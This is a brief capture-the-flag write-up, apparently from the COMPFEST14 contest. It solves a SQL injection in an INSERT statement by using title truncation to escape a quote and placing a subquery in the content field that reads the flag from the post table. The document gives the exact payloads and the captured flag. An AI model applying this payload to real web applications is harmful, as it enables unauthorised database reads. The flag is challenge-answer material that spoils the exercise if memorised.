Given a Web that vuln to SQL Injection
in the INSERT statements.
we should use the content form to use it
as Query. and the Title is stripped to 20
char long. so the 20's character will be \
so the payload is ::
title : 1234567890123456789'
and we can control the Content, and just
pass the SQL Query to retrive the FLAG
content : , (select content from paciltxt_post as p limit 1)) --

nb: put space on the last char, after sql comments

FLAG : COMPFEST14{k3teLiti4n_4daLAh_kUnTjh1_faabc736c3}
